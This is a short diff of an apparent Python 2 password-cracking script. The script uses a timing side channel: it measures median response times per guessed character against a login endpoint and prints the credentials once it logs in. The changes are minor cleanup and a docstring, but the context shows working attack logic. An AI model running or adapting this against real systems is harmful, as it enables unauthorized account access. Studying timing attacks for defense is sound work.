@@ -51,13 +51,11 @@ def makerequest(guess):
                 print "Successfully logged in! Username: " + USERNAME + " Password: " + newguess
                 sys.exit()
             #print "response is: " + r.text
-            #chartimes[c] += end - start
             chartimes[c].append(end - start)
             if i == NUMREQUESTS-1:
                 totaltime = 0
                 for i in chartimes[c]:
                     totaltime += i
-                #print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(chartimes[c]) + " seconds."
                 print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(totaltime) + " seconds."
 
     # get avg of chartimes
@@ -68,7 +66,6 @@ def makerequest(guess):
     n = 0
 
     # sort the characters based on the average time
-    #print "Average time per request for each password guess"
     print "Median time per request for each password guess"
     for key, value in sorted(chartimemedian.iteritems(), key=lambda (k,v): (v,k)):
         print "%s: %s" % (key, value)
@@ -86,6 +83,14 @@ def makerequest(guess):
         n += 1
 
 def getmedian(chartimes):
+    '''
+        Takes the passed parameter (chartimes) as a dict. The key:value pairs 
+        are character: [list of length of time per req] where the list contains
+        values for the response time for each request for that char.
+
+        Return: the dict in a key:value pair where the value is the median time
+        for all of the requests 
+    '''
 
     chartimemedian = {}
 
